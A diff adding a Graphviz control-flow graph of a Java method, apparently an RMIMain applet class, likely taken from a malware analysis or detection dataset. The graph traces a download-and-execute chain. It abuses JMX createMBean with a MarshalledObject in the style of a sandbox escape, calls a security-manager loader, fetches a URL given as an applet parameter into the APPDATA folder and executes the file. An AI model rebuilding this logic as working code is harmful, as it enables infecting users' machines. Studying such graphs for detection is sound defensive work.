@@ -1,0 +1,161 @@
+digraph "" {
+    "r0 := @this: RMIMain"
+    "load.r r0"
+    "r0 := @this: RMIMain"->"load.r r0";
+    "virtualinvoke <RMIMain: java.rmi.MarshalledObject getResource()>"
+    "load.r r0"->"virtualinvoke <RMIMain: java.rmi.MarshalledObject getResource()>";
+    "store.r r3"
+    "virtualinvoke <RMIMain: java.rmi.MarshalledObject getResource()>"->"store.r r3";
+    "store.r r3"->"load.r r0";
+    "specialinvoke <RMIMain: javax.management.remote.rmi.RMIServerImpl getRMIServerImpl()>"
+    "load.r r0"->"specialinvoke <RMIMain: javax.management.remote.rmi.RMIServerImpl getRMIServerImpl()>";
+    "store.r r4"
+    "specialinvoke <RMIMain: javax.management.remote.rmi.RMIServerImpl getRMIServerImpl()>"->"store.r r4";
+    "load.r r4"
+    "store.r r4"->"load.r r4";
+    "load.r r4"->"load.r r0";
+    "specialinvoke <RMIMain: javax.management.MBeanServer getMbeanServer()>"
+    "load.r r0"->"specialinvoke <RMIMain: javax.management.MBeanServer getMbeanServer()>";
+    "virtualinvoke <javax.management.remote.rmi.RMIServerImpl: void setMBeanServer(javax.management.MBeanServer)>"
+    "specialinvoke <RMIMain: javax.management.MBeanServer getMbeanServer()>"->"virtualinvoke <javax.management.remote.rmi.RMIServerImpl: void setMBeanServer(javax.management.MBeanServer)>";
+    "new javax.management.remote.rmi.RMIConnectionImpl"
+    "virtualinvoke <javax.management.remote.rmi.RMIServerImpl: void setMBeanServer(javax.management.MBeanServer)>"->"new javax.management.remote.rmi.RMIConnectionImpl";
+    "dup1.r"
+    "new javax.management.remote.rmi.RMIConnectionImpl"->"dup1.r";
+    "dup1.r"->"load.r r4";
+    "push \"javarmi\""
+    "load.r r4"->"push \"javarmi\"";
+    "push null"
+    "push \"javarmi\""->"push null";
+    "push null"->"push null";
+    "push null"->"push null";
+    "specialinvoke <javax.management.remote.rmi.RMIConnectionImpl: void <init>(javax.management.remote.rmi.RMIServerImpl,java.lang.String,java.lang.ClassLoader,javax.security.auth.Subject,java.util.Map)>"
+    "push null"->"specialinvoke <javax.management.remote.rmi.RMIConnectionImpl: void <init>(javax.management.remote.rmi.RMIServerImpl,java.lang.String,java.lang.ClassLoader,javax.security.auth.Subject,java.util.Map)>";
+    "push \"RMIClassLoader\""
+    "specialinvoke <javax.management.remote.rmi.RMIConnectionImpl: void <init>(javax.management.remote.rmi.RMIServerImpl,java.lang.String,java.lang.ClassLoader,javax.security.auth.Subject,java.util.Map)>"->"push \"RMIClassLoader\"";
+    "push \"RMIClassLoader\""->"push null";
+    "push null"->"push null";
+    "load.r r3"
+    "push null"->"load.r r3";
+    "load.r r3"->"push null";
+    "push null"->"push null";
+    "virtualinvoke <javax.management.remote.rmi.RMIConnectionImpl: javax.management.ObjectInstance createMBean(java.lang.String,javax.management.ObjectName,javax.management.ObjectName,java.rmi.MarshalledObject,java.lang.String[],javax.security.auth.Subject)>"
+    "push null"->"virtualinvoke <javax.management.remote.rmi.RMIConnectionImpl: javax.management.ObjectInstance createMBean(java.lang.String,javax.management.ObjectName,javax.management.ObjectName,java.rmi.MarshalledObject,java.lang.String[],javax.security.auth.Subject)>";
+    "pop"
+    "virtualinvoke <javax.management.remote.rmi.RMIConnectionImpl: javax.management.ObjectInstance createMBean(java.lang.String,javax.management.ObjectName,javax.management.ObjectName,java.rmi.MarshalledObject,java.lang.String[],javax.security.auth.Subject)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <javax.management.remote.rmi.RMIConnectionImpl: javax.management.ObjectInstance createMBean(java.lang.String,javax.management.ObjectName,javax.management.ObjectName,java.rmi.MarshalledObject,java.lang.String[],javax.security.auth.Subject)>"->"store.r r3";
+    "staticget <RMIClassLoader: RMIClassLoader instance>"
+    "store.r r3"->"staticget <RMIClassLoader: RMIClassLoader instance>";
+    "virtualinvoke <RMIClassLoader: void LoadSecurityManager()>"
+    "staticget <RMIClassLoader: RMIClassLoader instance>"->"virtualinvoke <RMIClassLoader: void LoadSecurityManager()>";
+    "virtualinvoke <RMIClassLoader: void LoadSecurityManager()>"->"load.r r0";
+    "push \"F\""
+    "load.r r0"->"push \"F\"";
+    "virtualinvoke <RMIMain: java.lang.String getParameter(java.lang.String)>"
+    "push \"F\""->"virtualinvoke <RMIMain: java.lang.String getParameter(java.lang.String)>";
+    "store.r r28"
+    "virtualinvoke <RMIMain: java.lang.String getParameter(java.lang.String)>"->"store.r r28";
+    "push \"APPDATA\""
+    "store.r r28"->"push \"APPDATA\"";
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"
+    "push \"APPDATA\""->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+    "store.r r29"
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"store.r r29";
+    "store.r r29"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "new java.net.URL"
+    "load.r r0"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "push \"U\""
+    "load.r r0"->"push \"U\"";
+    "push \"U\""->"virtualinvoke <RMIMain: java.lang.String getParameter(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "virtualinvoke <RMIMain: java.lang.String getParameter(java.lang.String)>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "virtualinvoke <RMIMain: java.net.URLConnection OpenConnection(java.net.URL)>"
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <RMIMain: java.net.URLConnection OpenConnection(java.net.URL)>";
+    "virtualinvoke <RMIMain: java.io.InputStream GetInputStream(java.net.URLConnection)>"
+    "virtualinvoke <RMIMain: java.net.URLConnection OpenConnection(java.net.URL)>"->"virtualinvoke <RMIMain: java.io.InputStream GetInputStream(java.net.URLConnection)>";
+    "virtualinvoke <RMIMain: java.io.InputStream GetInputStream(java.net.URLConnection)>"->"store.r r3";
+    "store.r r3"->"load.r r0";
+    "new java.lang.StringBuilder"
+    "load.r r0"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "load.r r29"
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r29";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "load.r r29"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\\\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\\"";
+    "push \"\\\\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "load.r r28"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r28";
+    "load.r r28"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <RMIMain: java.io.FileOutputStream GetOutputStream(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <RMIMain: java.io.FileOutputStream GetOutputStream(java.lang.String)>";
+    "virtualinvoke <RMIMain: java.io.FileOutputStream GetOutputStream(java.lang.String)>"->"store.r r4";
+    "push 512"
+    "store.r r4"->"push 512";
+    "newarray"
+    "push 512"->"newarray";
+    "store.r r5"
+    "newarray"->"store.r r5";
+    "store.r r5"->"load.r r3";
+    "load.r r5"
+    "load.r r3"->"load.r r5";
+    "push 0"
+    "load.r r5"->"push 0";
+    "push 0"->"load.r r5";
+    "arraylength"
+    "load.r r5"->"arraylength";
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"
+    "arraylength"->"virtualinvoke <java.io.InputStream: int read(byte[],int,int)>";
+    "store.i $i2"
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"->"store.i $i2";
+    "load.i $i2"
+    "store.i $i2"->"load.i $i2";
+    "push -1"
+    "load.i $i2"->"push -1";
+    "ifcmpeq.i load.r r3"
+    "push -1"->"ifcmpeq.i load.r r3";
+    "ifcmpeq.i load.r r3"->"load.r r4";
+    "load.r r4"->"load.r r5";
+    "load.r r5"->"push 0";
+    "push 0"->"load.i $i2";
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"
+    "load.i $i2"->"virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>";
+    "goto load.r r3"
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"goto load.r r3";
+    "store.r r0"
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"store.r r0";
+    "store.r r0"->"goto return";
+    "ifcmpeq.i load.r r3"->"load.r r3";
+    "virtualinvoke <java.io.InputStream: void close()>"
+    "load.r r3"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r r4";
+    "virtualinvoke <java.io.FileOutputStream: void close()>"
+    "load.r r4"->"virtualinvoke <java.io.FileOutputStream: void close()>";
+    "virtualinvoke <java.io.FileOutputStream: void close()>"->"load.r r0";
+    "load.r r0"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r29";
+    "load.r r29"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\\"";
+    "push \"\\\\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r28";
+    "load.r r28"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <RMIMain: void Execute(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <RMIMain: void Execute(java.lang.String)>";
+    "goto goto return"
+    "virtualinvoke <RMIMain: void Execute(java.lang.String)>"->"goto goto return";
+}
